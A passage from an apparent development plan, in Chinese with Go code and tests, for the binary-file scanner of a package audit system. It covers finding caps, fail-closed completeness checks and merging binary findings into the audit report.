- [ ] **Step 3: 实现**

创建 `internal/codeaudit/binary_scanner.go`：

```go
package codeaudit

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// BinaryScanSummary is what one binary pass knows about its own completeness.
// Every field is a distinct way for the pass to have not looked, and the zero
// value says it looked everywhere - which is why each is incremented where the
// loss happens rather than inferred afterwards.
type BinaryScanSummary struct {
	// FilesCount is how many files the channel examined.
	FilesCount int `json:"files_count"`
	// Kinds is the per-kind file count, so a reader can see what the package was
	// made of without walking the findings.
	Kinds map[string]int `json:"kinds,omitempty"`
	// BoundedExecutable counts files whose structural extraction was cut short
	// and whose format can carry an executed payload. A pass over one of these is
	// not evidence of absence, and ProvesCleanScan withholds it.
	BoundedExecutable int `json:"bounded_executable,omitempty"`
	// BoundedData counts files whose extraction was cut short and whose format
	// is data on this platform. It is recorded because a reader should see it,
	// and it does not withhold a verdict: a bounded tensor blob cannot run.
	BoundedData int `json:"bounded_data,omitempty"`
	// Incomplete counts paths the channel set out to examine and could not: a
	// file that would not open, a file whose extraction failed, and a subtree the
	// walk could not read. It is named for what the pass failed to see rather than
	// for the file count, because an unreadable directory is not a file and still
	// has to make the pass admit it looked at nothing.
	Incomplete int `json:"incomplete,omitempty"`
	// Errored records that the pass could not run at all - the walk failed before
	// it examined anything. It is a gap for the same reason Incomplete is: a pass
	// that did not happen is not evidence of absence, and the alternative (an
	// error out of the channel) would delete the package through
	// internal/controller/import_processing.go:642-660 without the report ever
	// saying why.
	Errored bool `json:"errored,omitempty"`
	// FindingsCapped records that the finding cap dropped at least one finding.
	//
	// It is deliberately not the report's Truncated and is deliberately not folded
	// into it. Reaching the cap is a listing budget being spent, not a look that
	// did not happen, and the report's Truncated is one of the conditions
	// ProvesCleanScan refuses on - folding this into it would make the channel
	// delete a package for having found too much. Only LOW findings are ever
	// dropped (see ScanDirectory), and LOW blocks under neither the `assist` nor
	// the `gate` policy - MEDIUM does block under `gate`, which is exactly why the
	// cap keeps it - so nothing the cap drops could have blocked the import.
	FindingsCapped bool `json:"findings_capped,omitempty"`
	// FindingsDropped is how many LOW findings the cap dropped, so the count
	// travels with the flag rather than being re-derived from a list that no
	// longer has them.
	FindingsDropped int `json:"findings_dropped,omitempty"`
	// MaxFindings is the listing budget this pass ran under, carried into the
	// report so that a reader who sees findings_capped can tell what it was capped
	// at without re-reading the scanner's configuration. It is provenance, not a
	// second ceiling: MergeBinaryFindings does not reapply it to the joined list.
	MaxFindings int `json:"max_findings,omitempty"`
}

// BinaryScanResult is everything one binary pass produces.
type BinaryScanResult struct {
	Findings []Finding
	Summary  BinaryScanSummary
	// Claimed is every path the channel classified as binary, in walk order.
	// MergeBinaryFindings uses it to decide which files the source channel must
	// not also be believed about - a file whose bytes are binary is not a file
	// whose text reading means anything.
	Claimed []string
	// Evidence holds the listing for files that produced findings, and only for
	// those. The Tier 2 file prompt needs it, and a clean package should not pay
	// for a listing no one will read - the same principle the scanner applies to
	// parsing a source file.
	Evidence map[string]*EvidenceSet
}

// BinaryScanner walks a directory and audits the binary files in it.
//
// It is deliberately not a StaticEngine. The two engines are alternatives to
// each other, and this is not an alternative to either: a deployment that chose
// semgrep for source must still get binary coverage, and one that chose the
// regex baseline must not be the only one without it.
type BinaryScanner struct {
	matcher *BinaryMatcher
	cfg     BinaryConfig
}

// NewBinaryScanner builds a scanner. A nil matcher is replaced with the default
// table rather than being an error, because the table has no failure mode a
// caller could act on.
func NewBinaryScanner(matcher *BinaryMatcher, cfg BinaryConfig) *BinaryScanner {
	if matcher == nil {
		matcher, _ = NewBinaryMatcher()
	}
	return &BinaryScanner{matcher: matcher, cfg: normalizeBinaryConfig(cfg)}
}

// ScanDirectory walks dir in lexical order and audits every binary file in it.
//
// The walk covers every regular file, not a list of extensions: the
// classification is made from the head of each file, so a binary named .py is
// found and a text file named .so is found, and neither depends on a list
// somebody could rename around. Reading 4 KiB of each of a few hundred files
// costs less than one semgrep invocation.
func (s *BinaryScanner) ScanDirectory(dir string) (*BinaryScanResult, error) {
	info, err := os.Stat(dir)
	if err != nil {
		return nil, fmt.Errorf("scan directory: %w", err)
	}
	if !info.IsDir() {
		return nil, fmt.Errorf("%s is not a directory", dir)
	}

	res := &BinaryScanResult{
		Summary: BinaryScanSummary{
			Kinds:       map[string]int{},
			MaxFindings: s.cfg.MaxFindings,
		},
		Evidence: map[string]*EvidenceSet{},
	}

	err = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			// The walk could not read this path. Two shapes arrive here: an entry
			// whose lstat failed (filepath.Walk passes info as nil, because there
			// is no FileInfo to pass), and a directory whose entries would not
			// list (info is the directory itself and err is the listing error).
			// Either way there is nothing here to classify - a nil info has no
			// mode and no bytes, and a directory has no bytes of its own.
			//
			// Returning nil is deliberate - one unreadable subtree must not abort
			// the audit of the rest - but the skip must not be silent either. This
			// is the count the classify-open and extraction failures below use, and
			// it is what makes an unreadable subtree withhold the pass rather than
			// leave a scan that looks read-and-clean. At the root it is the
			// difference between a clean scan of zero files and a scan that admits
			// it looked at nothing.
			res.Summary.Incomplete++
			return nil
		}
		if info.IsDir() {
			if s.cfg.SkipDirs[info.Name()] {
				return filepath.SkipDir
			}
			return nil
		}
		if !info.Mode().IsRegular() {
			// A symlink, fifo, device or socket is not a file this channel reads,
			// and it is deliberately not followed: filepath.Walk lstats each
			// entry, so an entry that only points at a binary is skipped rather
			// than read through. Following one would let a link out of the model
			// directory pull in a file the package does not contain.
			return nil
		}

		kind, headErr := s.classify(path)
		if headErr != nil {
			// The walk reached the file and could not open it. That is a look
			// that did not happen, so it is counted Incomplete and
			// ProvesCleanScan withholds the pass - rather than being returned
			// away as though the file were not there, which is the fail-open the
			// completeness contract exists to close: a file the channel never
			// read would otherwise be invisible to every downstream reader.
			// The error is not propagated: one unreadable file must not abort the
			// audit of the rest, so it reaches the report through the count
			// instead of through the error path. It is also not added to Claimed,
			// because Claimed means "classified as binary" and this file was
			// never classified - so the source channel's own reading of it is
			// left alone rather than suppressed on a guess.
			res.Summary.Incomplete++
			return nil
		}
		if kind == KindText {
			return nil
		}

		res.Claimed = append(res.Claimed, path)
		set := CollectEvidence(path, kind, s.cfg)
		res.Summary.FilesCount++
		res.Summary.Kinds[string(kind)]++

		if set.Err != nil {
			// Extraction failed on a file that classify had already called binary:
			// the archive would not open, the ELF would not parse, the stream would
			// not decompress. That is a look that did not happen, and it is counted
			// - never silently skipped, because a file the channel could not read
			// and a file it decided not to read must not reach the report looking
			// the same. The host has the shape to test it with: 21 truncated
			// CUDA/MLX libraries under teellm/ and
			// deploy/guest-build/semgrep-payload/rootfs are ~10 MiB on disk with
			// their section headers at a ~116 MB offset, so elf.NewFile returns
			// EOF. Counting is what makes such a file withhold the pass instead of
			// passing as clean.
			res.Summary.Incomplete++
			return nil
		}
		if set.Bound.Structural {
			if isExecutableKind(kind) {
				res.Summary.BoundedExecutable++
			} else {
				res.Summary.BoundedData++
			}
		} else if set.Bound.Listing {
			// A capped listing is a data bound for every kind: the file was read,
			// and what is missing is evidence lines rather than unexamined bytes.
			res.Summary.BoundedData++
		}

		matches := s.matcher.MatchAll(set.Lines)
		if len(matches) == 0 {
			return nil
		}
		res.Evidence[path] = set
		for _, m := range matches {
			res.Findings = append(res.Findings, binaryFinding(set, m))
		}
		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("walk directory: %w", err)
	}

	// Sorted before capping, for the same reason the semgrep adapter sorts before
	// its cap: the cap keeps the first N, so a varying order would make a capped
	// pass keep a different set each time.
	//
	// The cap drops LOW findings and only LOW. A finding that can block the
	// import under either supported policy is kept whether or not it fits the
	// budget, and the list grows past MaxFindings instead. Both severities have
	// to be named, because a rule that read only the default policy would keep
	// the wrong set: `assist` withholds on HIGH alone, but `gate` withholds on
	// HIGH or MEDIUM (internal/codeaudit/audit.go:298-309), and DYN_001 - MEDIUM
	// in the shared table - deletes the package the moment an operator switches
	// to `gate`. Dropping a blocking finding would turn a package that must be
	// withheld into one that passes, which is the one failure a cap must not be
	// able to cause, and an attacker aims at exactly it by padding a package with
	// cheap LOW findings until the ones that block fall off the end of the list.
	//
	// The cost is real and is accepted: a crafted package can produce an
	// unbounded number of MEDIUM findings, because none of them may be dropped.
	// A report that grows is the safe direction to fail in; a report that is
	// short by a blocking finding is not.
	//
	// Reaching the budget is recorded on the summary and nowhere else - it must
	// not reach Report.Truncated, whose readers treat it as a completeness
	// failure and delete the package.
	sortFindings(res.Findings)
	if len(res.Findings) > s.cfg.MaxFindings {
		kept := make([]Finding, 0, len(res.Findings))
		dropped := 0
		for _, f := range res.Findings {
			// Written as "not LOW" rather than "is HIGH or MEDIUM" on purpose:
			// the set that may be dropped has to be the one that cannot block,
			// so anything the code does not positively know to be LOW is kept.
			// rules.go declares no SeverityLow, so LOW is a bare string here and
			// in the table that writes it.
			if len(kept) < s.cfg.MaxFindings || f.Severity != "LOW" {
				kept = append(kept, f)
				continue
			}
			dropped++
		}
		res.Findings = kept
		if dropped > 0 {
			res.Summary.FindingsCapped = true
			res.Summary.FindingsDropped = dropped
		}
	}
	return res, nil
}

// classify reads a file's head and decides how it should be read.
//
// A zero-byte file is not an error here. os.File.Read on an empty file returns
// (0, io.EOF), so treating "err != nil && n == 0" as a failure would return
// every empty regular file as an unreadable one - and ScanDirectory counts an
// unreadable file as Incomplete, which withholds the pass. An empty __init__.py
// is routine, so that would fail a legitimate package over a file with no bytes
// to read. The branch below therefore distinguishes "could not open" (a real
// error, returned) from "opened and is empty" (io.EOF with nothing read, not an
// error), and lets ClassifyBinary decide the empty head the same way it decides
// any other: an empty .py is KindText and is skipped, not counted.
func (s *BinaryScanner) classify(path string) (BinaryKind, error) {
	f, err := os.Open(path)
	if err != nil {
		return KindText, err
	}
	defer f.Close()

	head := make([]byte, sniffBytes)
	n, err := f.Read(head)
	if err != nil && err != io.EOF {
		return KindText, err
	}
	return ClassifyBinary(head[:n], path), nil
}

// binaryFinding turns one matched evidence line into a finding.
//
// Line is the evidence line's index, not a source line number: a binary has no
// lines, and the index is the coordinate that resolves against the listing the
// report carries. CodeSnippet and the context window are the rendered listing
// around it, built with the same geometry the source arms use - three lines each
// side - so the Tier 2 prompt has one shape whichever channel produced the
// finding.
func binaryFinding(set *EvidenceSet, m binaryMatch) Finding {
	line := set.Lines[m.Index]
	return Finding{
		File:           set.File,
		Line:           line.Index,
		RuleID:         m.Rule.ID,
		Category:       m.Rule.Category,
		Severity:       m.Rule.Severity,
		Description:    m.Rule.Description,
		CodeSnippet:    line.Text,
		ContextBefore:  renderEvidenceWindow(set.Lines, m.Index-3, m.Index),
		ContextAfter:   renderEvidenceWindow(set.Lines, m.Index+1, m.Index+4),
		Engine:         EngineNameBinary,
		BinaryKind:     string(set.Kind),
		EvidenceSource: string(line.Source),
		BinaryOffset:   line.Offset,
	}
}

// renderEvidenceWindow renders the listing lines in [start, end) the way the
// prompt shows them. The geometry matches contextWindow's, deliberately: the two
// channels feed one prompt, and a window that meant something different on one
// side would be a difference the reader cannot see.
func renderEvidenceWindow(lines []EvidenceLine, start, end int) string {
	if start < 0 {
		start = 0
	}
	if end > len(lines) {
		end = len(lines)
	}
	if start >= end {
		return ""
	}
	out := make([]string, 0, end-start)
	for _, l := range lines[start:end] {
		out = append(out, fmt.Sprintf("[%s] %s", l.Source, l.Text))
	}
	return joinTrimmed(out)
}
```

> **陷阱：两个通道的封顶不是同一个安全模型，别把它们"统一"起来。** 文本通道的封顶是**按位置丢**的——`scanner.go:97-100` 在走的过程中把 `findings` 截到 `MaxFindings`、置 `truncated = true`、`return filepath.SkipAll`（第二处同形的在 `scanner.go:298-301`，semgrep 适配器在 `semgrep_engine.go:239-243` 置同一个 `truncated`）。它**安全**，是因为任何一次丢弃都会置 `truncated`，而 `truncated` 被 `rules.go:126-134` 的 `ProvesCleanScan` 折进去、并在 `scanner.go:231`、`verifier.go:188`/`verifier.go:235`、`audit.go:354`/`audit.go:314-316` 处被 AND 起来——所以文本通道丢一个 finding 的后果是"这个包被扣下"，不是"这个包通过"。
>
> **二进制通道故意不是这样**：下面的 cap 只裁剪**报告里的清单**，`FindingsCapped`/`FindingsDropped` 按 Task 10 的设计**不进** `ProvesCleanScan`，也就是说二进制通道丢一个 finding **不会**让包被扣下。它的安全因此**完全落在**这条 keep 规则上：cap 只花 **LOW** 这一档，保住 **HIGH 与 MEDIUM**，并对未知严重级 fail-closed（所以写的是 `f.Severity != "LOW"` 而不是 `f.Severity == "HIGH" || f.Severity == "MEDIUM"`）。写 `!= "LOW"` 的理由是：**能被丢的那一档必须恰好是"不能阻断"的那一档**，代码不确知是 LOW 的东西都要留下——`rules.go` 里根本没有 `SeverityLow` 常量，`"LOW"` 是个裸字符串，`gate` 下 MEDIUM 一样阻断（`audit.go:298-309`），而 `DYN_001` 正是 MEDIUM。
>
> **为什么"统一"会删掉合法包**：二进制证据产生的 finding 数量远多于文本通道——一个 `.so` 的动态符号表一次就能出几十条。若照文本通道的样子让"触顶"也去**扣包**（把 `FindingsCapped` 折进 `ProvesCleanScan`、或让二进制臂也按位置丢并在丢时置 `truncated`），那么任何产出超过 `MaxFindings` 条 finding 的**合法**包（一个正常的加速库就能做到）都会被 `cleanDirContents` 删掉。所以这两个通道**必须**保持不同的封顶语义；改其中一边时要同时看懂另一边——把 `FindingsCapped` 折进完整性判定是删合法包，把 keep 规则放宽成"只保 HIGH"（assist 视角）则是放走 `gate` 下本应阻断的 MEDIUM。`TestBinaryScannerCapKeepsAMediumFindingBeyondTheBudget` 钉的就是后一条。

`joinTrimmed` 是个小工具，追加到 `binary_scanner.go`：

```go
// joinTrimmed joins rendered evidence lines, keeping the same trimming the
// source arms' contextWindow applies.
func joinTrimmed(lines []string) string {
	var b strings.Builder
	for i, l := range lines {
		if i > 0 {
			b.WriteByte('\n')
		}
		b.WriteString(l)
	}
	return strings.TrimSpace(b.String())
}
```

import 块补 `"strings"`。

- [ ] **Step 4: 补 `Finding` 的二进制字段与 `EngineNameBinary` 常量**

先修改 `internal/codeaudit/rules.go`，在 `Finding` 结构体末尾（`Engine` 字段之后）追加这三个字段：

```go
	// BinaryKind names the reading the binary channel applied to File: "elf",
	// "archive", "pickle", "compressed", "numpy" or "raw". Empty for a finding
	// the source channel produced, which is what makes the two kinds of finding
	// distinguishable in a merged list without consulting the engine field.
	BinaryKind string `json:"binary_kind,omitempty"`
	// EvidenceSource names the evidence a binary finding came from: a dynamic
	// symbol, a DT_NEEDED library, a string literal, a section summary, an
	// entropy verdict, a container member or a pickle target. It is what tells a
	// reader how much weight the finding carries - a symbol name is a capability
	// the binary has, a string literal is a thing it says.
	EvidenceSource string `json:"evidence_source,omitempty"`
	// BinaryOffset is the byte offset in File the evidence was read at, for the
	// evidence that has one. Symbol and section evidence carries zero: it names
	// a property of the file rather than a byte range in it.
	BinaryOffset int64 `json:"binary_offset,omitempty"`
```

> 这三个字段归本任务，不归 Task 10：Step 1 的测试与 `binaryFinding` 都要用它们，声明必须落在**第一个使用它们的任务**里，包才在本任务的提交点编译。`Report.Binary` 仍留在 Task 10——第一个读它的 `ProvesCleanScan` 在那边。

再修改 `internal/codeaudit/cpg_analysis.go:14` 旁边，在 `EngineNameCPG` 声明后追加：

```go
// EngineNameBinary names the binary channel in the Engine field of a finding it
// produced. Like EngineNameCPG it is not a selectable Tier 1 engine - a
// deployment configures a source engine and gets this channel in addition - so
// NewEngine rejects it, which a test pins.
const EngineNameBinary = "binary"
```

- [ ] **Step 5: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestBinaryScanner|TestSortFindings' -v 2>&1 | tail -20
```

预期全 PASS。`TestSortFindings` 也在这一次运行里：它钉的是 `ScanDirectory` 调用的那个排序本身，而扫描层的用例构造不出乱序（见 `TestBinaryScannerIsDeterministic` 的注释），所以它必须被显式选进来。

- [ ] **Step 6: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/binary_scanner.go internal/codeaudit/binary_scanner_test.go internal/codeaudit/rules.go internal/codeaudit/cpg_analysis.go
git commit -m "feat(audit): add the binary scanner with deterministic ordering and finding cap"
```

---

### Task 10: 报告字段与 fail-closed 折入

**Files:**
- Modify: `internal/codeaudit/rules.go`
- Test: `internal/codeaudit/failclosed_test.go`

- [ ] **Step 1: 写失败测试**

追加到 `internal/codeaudit/failclosed_test.go`：

```go
// TestProvesCleanScanWithholdsOnBinaryGaps pins the fold. A report whose binary
// channel did not look everywhere is not evidence of absence, and the two
// classes are treated differently on purpose: a bounded executable is a look
// that did not finish, a bounded data file is a look that finished on as much as
// there was reason to read.
//
// The finding cap is in the table as a case that does NOT withhold, because that
// is the property being pinned: reaching the cap means the channel found more
// than its listing budget, which is not the same fact as a look that did not
// happen, and treating it as one would delete a package for having findings.
func TestProvesCleanScanWithholdsOnBinaryGaps(t *testing.T) {
	base := func(sum BinaryScanSummary) *Report {
		return &Report{
			ScanComplete:    true,
			ProcessExitCode: 0,
			Binary:          &sum,
		}
	}
	cases := []struct {
		name string
		sum  BinaryScanSummary
		want bool
	}{
		{"no binary files at all", BinaryScanSummary{}, true},
		{"files examined, nothing bounded", BinaryScanSummary{FilesCount: 3}, true},
		{"a bounded data file is visible but does not withhold", BinaryScanSummary{FilesCount: 3, BoundedData: 1}, true},
		{"a capped listing is a data bound", BinaryScanSummary{FilesCount: 3, BoundedData: 2}, true},
		{"the finding cap does not withhold", BinaryScanSummary{FilesCount: 3, FindingsCapped: true, FindingsDropped: 4}, true},
		{"a bounded executable withholds", BinaryScanSummary{FilesCount: 3, BoundedExecutable: 1}, false},
		{"an unexamined file withholds", BinaryScanSummary{FilesCount: 3, Incomplete: 1}, false},
		{"a pass that could not run withholds", BinaryScanSummary{Errored: true}, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := base(tc.sum).ProvesCleanScan(); got != tc.want {
				t.Errorf("ProvesCleanScan() = %v, want %v for %+v", got, tc.want, tc.sum)
			}
		})
	}
}

// TestProvesCleanScanUnchangedWithoutABinaryChannel pins the rollback: a report
// that never ran the binary channel - every existing caller, and any deployment
// that turns it off - behaves exactly as it did before.
func TestProvesCleanScanUnchangedWithoutABinaryChannel(t *testing.T) {
	r := &Report{ScanComplete: true, ProcessExitCode: 0}
	if !r.ProvesCleanScan() {
		t.Error("a report with no binary channel must still prove a clean scan")
	}
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run 'TestProvesCleanScan' 2>&1 | head -10
```

预期：编译失败，`unknown field Binary in struct literal of type Report`。

- [ ] **Step 3: 实现**

修改 `internal/codeaudit/rules.go`。

`Finding` 的三个二进制字段（`BinaryKind`/`EvidenceSource`/`BinaryOffset`）在 Task 9 就已追加——那是第一个使用它们的任务，本任务不再重复。本任务只加 `Report` 上的字段与折入。

在 `Report` 结构体末尾（`ProcessExitCode` 之后）追加：

```go
	// Binary is the binary channel's account of its own completeness. Nil means
	// the channel did not run, which is what a deployment that turned it off
	// produces and what every report predating it carries.
	//
	// It lives on the Report rather than on the AuditReport because
	// ProvesCleanScan is what has to read it, and the whole point of that method
	// is that every way of not having looked withholds the pass in one place.
	Binary *BinaryScanSummary `json:"binary,omitempty"`
```

修改 `ProvesCleanScan`：

```go
func (r *Report) ProvesCleanScan() bool {
	if r == nil {
		return false
	}
	if !(r.ScanComplete &&
		!r.Truncated &&
		r.ParserErrors == 0 &&
		r.UnsupportedExts == 0 &&
		r.ProcessExitCode == 0) {
		return false
	}
	// The binary channel's gaps fold in here rather than at its own call sites,
	// for the same reason every other field is read here: this is the one
	// function that answers "did the scan look", and a check applied anywhere
	// else is a check a later recomputation can drop.
	//
	// BoundedData and FindingsCapped are deliberately not read. A tensor blob
	// whose listing was capped is a file that was read, and a package whose
	// findings outran the listing budget is a pass that looked at everything and
	// found too much; neither is a look that did not happen, and only a look that
	// did not happen can make a pass a claim about absence.
	if b := r.Binary; b != nil {
		if b.BoundedExecutable > 0 || b.Incomplete > 0 || b.Errored {
			return false
		}
	}
	return true
}
```

> **陷阱：两个通道的封顶不是同一个安全模型，别把二进制的 `FindingsCapped` 折进这个判定。** 文本通道的封顶是**按位置丢** finding 的（`scanner.go:97-100` 的截断加 `return filepath.SkipAll`、`scanner.go:298-301` 的同形第二处、`semgrep_engine.go:239-243`），它**安全**是因为任何一次丢弃都会置 `truncated = true`，而 `truncated` 正是这个函数（`rules.go:126-134`）读的完整性字段之一——文本通道丢一个 finding 的代价是"包被扣下"（`scanner.go:231`、`verifier.go:188`/`verifier.go:235`、`audit.go:354`/`audit.go:314-316` 把这条 AND 链起来）。
>
> **二进制通道故意不这样**：它裁剪的只是**报告里的清单**，`FindingsCapped`/`FindingsDropped` **故意不折进**这里（上面 `BoundedData` 与 `FindingsCapped` 都被明确排除在读取之外，这是刻意的），所以二进制通道丢一个 finding 不扣包。这正是"把两个通道的封顶统一起来会删掉合法包"这句话的落点——**二进制证据产生的 finding 数量远多于文本通道**（一个 `.so` 的动态符号表一次就能出几十条），如果照文本通道的样子让"触顶"也去扣包，那么任何产出超过 `MaxFindings` 条 finding 的**合法**包（一个正常的加速库就能做到）都会被 `cleanDirContents` 删掉。所以二进制通道的安全**不靠**这个折入，而**完全**靠 Task 9 那条 keep 规则：cap 只花 LOW 一档、保住 HIGH **和** MEDIUM、对未知严重级 fail-closed。改这一对设计时要两边一起看——把 `FindingsCapped` 折进这里是删合法包，把 keep 规则放宽成"只保 HIGH"则是在 `gate` 下放走 MEDIUM 阻断 finding。

- [ ] **Step 4: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestProvesCleanScan|TestAHighFinding|TestIncomplete|TestTruncated|TestRecomputeReportPassed|TestScanMetadata|TestScanDirectory' -v 2>&1 | tail -30
```

预期全 PASS。已有的 fail-closed 测试必须保持通过——它们是这次改动的回归网。这里按**实际存在的函数名**逐一选中：`failclosed_test.go` 里是 `TestProvesCleanScan*`、`TestAHighFindingStillBlocksAnIncompleteScan`、`TestIncompleteScanCannotPassTheAuditConclusion`、`TestTruncatedScanCannotPassTheAuditConclusion`、`TestRecomputeReportPassedWithholdsPassForAnIncompleteScan`、`TestScanMetadataCarriesIncompletenessToTheReportThatLeaves`，`report_fields_test.go` 里是 `TestScanDirectory*`。**不要写成 `TestFailClosed`/`TestReportFields` 这样的前缀**——包里的测试不叫这两个名字，那样的 `-run` 只选中 `TestProvesCleanScan*` 一条，等于把回归网晾在一边。

- [ ] **Step 5: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/rules.go internal/codeaudit/failclosed_test.go
git commit -m "feat(audit): fold binary completeness into the clean-scan proof"
```

---

### Task 11: 合并进审计报告

**Files:**
- Modify: `internal/codeaudit/audit.go`
- Test: `internal/codeaudit/audit_test.go`

- [ ] **Step 1: 写失败测试**

追加到 `internal/codeaudit/audit_test.go`：

```go
// TestMergeBinaryFindingsAppendsAndRecomputes pins the three things the merge
// does at once: the binary findings join the list, the static counts are
// recomputed from the joined list, and the binary summary is attached *before*
// that recomputation so that ProvesCleanScan reads it.
//
// The fixture is built so the last assertion can fail. Both findings are MEDIUM,
// which under the default `assist` policy does not block, so the report passes
// before the merge and would still pass after it if the summary arrived too late
// - the only thing that can withdraw the pass is BoundedExecutable, and only if
// the summary was there when recomputeReportPassed ran. A fixture with a HIGH in
// it would hold this assertion whichever order the merge used, and would pin
// nothing.
func TestMergeBinaryFindingsAppendsAndRecomputes(t *testing.T) {
	report := &Report{
		ScanComplete: true,
		FilesCount:   1,
		Findings: []Finding{
			{File: "/m/clean.py", Line: 1, RuleID: "ENV_001", Severity: SeverityMedium},
		},
	}
	recomputeReportPassed(report, false)
	if !report.Passed {
		t.Fatal("fixture is wrong: a MEDIUM-only report passes under assist")
	}
	if report.MediumCount != 1 {
		t.Fatalf("fixture is wrong: MediumCount = %d, want 1", report.MediumCount)
	}

	res := &BinaryScanResult{
		Claimed: []string{"/m/libevil.so"},
		Findings: []Finding{
			{File: "/m/libevil.so", Line: 4, RuleID: "DYN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
		},
		Summary: BinaryScanSummary{FilesCount: 1, BoundedExecutable: 1},
	}

	MergeBinaryFindings(report, res)

	if len(report.Findings) != 2 {
		t.Fatalf("len(Findings) = %d, want 2", len(report.Findings))
	}
	if !containsFileFinding(report.Findings, "/m/libevil.so", "DYN_001") {
		t.Error("the binary finding did not join the list")
	}
	if report.Binary == nil {
		t.Fatal("report.Binary is nil; the completeness summary did not reach the report")
	}
	if report.MediumCount != 2 {
		t.Errorf("MediumCount = %d, want 2: the counts were not recomputed from the joined list", report.MediumCount)
	}
	if report.Passed {
		t.Error("Passed = true: the summary was attached after the recomputation, so ProvesCleanScan never saw BoundedExecutable")
	}
}

// TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles pins the cross-channel
// case. A binary file named .py is read by the source arm as text, and the lines
// it produces are a reading of bytes that are not text. Keeping both would report
// garbage alongside the evidence, and would let a crafted file pad its own audit
// with findings that mean nothing.
func TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles(t *testing.T) {
	report := &Report{
		ScanComplete: true,
		Findings: []Finding{
			{File: "/m/evil.py", Line: 12, RuleID: "CMD_001", Severity: SeverityHigh},
			{File: "/m/clean.py", Line: 3, RuleID: "CMD_001", Severity: SeverityHigh},
		},
	}
	res := &BinaryScanResult{
		Claimed: []string{"/m/evil.py"},
		Findings: []Finding{
			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityHigh, Engine: EngineNameBinary},
		},
	}

	MergeBinaryFindings(report, res)

	var files []string
	for _, f := range report.Findings {
		files = append(files, f.File+":"+f.RuleID)
	}
	if len(report.Findings) != 2 {
		t.Fatalf("findings = %v, want the text reading of evil.py replaced by the binary one", files)
	}
	for _, f := range report.Findings {
		if f.File == "/m/evil.py" && f.Engine != EngineNameBinary {
			t.Errorf("a text finding on a binary file survived: %s:%s", f.File, f.RuleID)
		}
	}
	if !containsFileFinding(report.Findings, "/m/clean.py", "CMD_001") {
		t.Error("a finding on a plain source file was dropped; the filter is too wide")
	}
}

// TestMergeBinaryFindingsKeepsBothChannelsFindings pins that the merge does not
// apply a ceiling to the joined list.
//
// Each channel caps its own findings before the merge. A second cap here would
// couple them: it would choose which findings to drop by path order rather than
// by importance, and it would let a large source arm evict the binary findings
// entirely. The fixture is the smallest one that shows the difference: three
// source findings, one binary finding, and a source arm whose own cap was three.
//
// The binary finding is DYN_001/MEDIUM rather than a blocked-family HIGH,
// because the pass assertion below has to survive the merge: what this test
// pins is the length of the joined list, and a HIGH binary finding would
// withdraw the pass on its own, making that assertion a statement about
// severity instead of about capping. MEDIUM does not block under `assist`, so
// the merge's own recomputation leaves the report passing and a future change
// that dropped a joined finding shows up as a shorter list.
func TestMergeBinaryFindingsKeepsBothChannelsFindings(t *testing.T) {
	report := &Report{ScanComplete: true, FilesCount: 3}
	for i := 0; i < 3; i++ {
		report.Findings = append(report.Findings, Finding{
			File: "/m/a.py", Line: i + 1, RuleID: "CMD_001", Severity: SeverityMedium,
		})
	}
	res := &BinaryScanResult{
		Findings: []Finding{
			{File: "/m/z.so", Line: 1, RuleID: "DYN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
		},
		Summary: BinaryScanSummary{FilesCount: 2},
	}

	MergeBinaryFindings(report, res)

	if len(report.Findings) != 4 {
		t.Errorf("len(Findings) = %d, want 4: the merge applied a ceiling to the joined list", len(report.Findings))
	}
	// The fourth has to be the binary one: a length check alone would also hold
	// if the merge had dropped a source finding and kept the binary one in its
	// place.
	if !containsFileFinding(report.Findings, "/m/z.so", "DYN_001") {
		t.Error("the binary finding is not in the joined list")
	}
	if report.Truncated {
		t.Error("Truncated = true: the merge re-capped a list both arms had already capped")
	}
	if !report.Passed {
		t.Error("Passed = false: the merge turned a package that passed into one that does not")
	}
	// Target.FilesScanned is copied from FilesCount, so the binary files have to
	// be in it or the report contradicts its own scan_metadata.binary block.
	if report.FilesCount != 5 {
		t.Errorf("FilesCount = %d, want 5 (3 source + 2 binary)", report.FilesCount)
	}
}

// TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated pins the decision
// that keeps the cap from deleting a package.
//
// The binary arm's cap drops LOW findings and only LOW (see
// BinaryScanner.ScanDirectory), and LOW blocks under neither policy, so it
// cannot have dropped anything that would have blocked the import - but the
// report's Truncated is a completeness flag
// that ProvesCleanScan refuses on, and folding this into it would turn "the
// channel found more than its listing budget" into "the channel did not look".
// The drop is visible where it belongs: findings_capped and findings_dropped on
// scan_metadata.binary.
func TestMergeBinaryFindingsDoesNotFoldTheBinaryCapIntoTruncated(t *testing.T) {
	report := &Report{ScanComplete: true, ProcessExitCode: 0}
	res := &BinaryScanResult{
		Summary: BinaryScanSummary{FilesCount: 1, FindingsCapped: true, FindingsDropped: 7},
	}

	MergeBinaryFindings(report, res)

	if report.Truncated {
		t.Error("Truncated = true after the binary arm capped itself; the channel deleted a package for finding too much")
	}
	if !report.Passed {
		t.Error("Passed = false although a capped listing is not a completeness gap: the cap drops only LOW")
	}
	if report.Binary == nil || !report.Binary.FindingsCapped || report.Binary.FindingsDropped != 7 {
		t.Errorf("the cap is not visible on scan_metadata.binary: %+v", report.Binary)
	}
	if !report.ProvesCleanScan() {
		t.Error("ProvesCleanScan() = false for a capped-only binary summary")
	}
}

func containsFileFinding(findings []Finding, file, rule string) bool {
	for _, f := range findings {
		if f.File == file && f.RuleID == rule {
			return true
		}
	}
	return false
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run TestMergeBinaryFindings 2>&1 | head -10
```

预期：编译失败，`undefined: MergeBinaryFindings`。

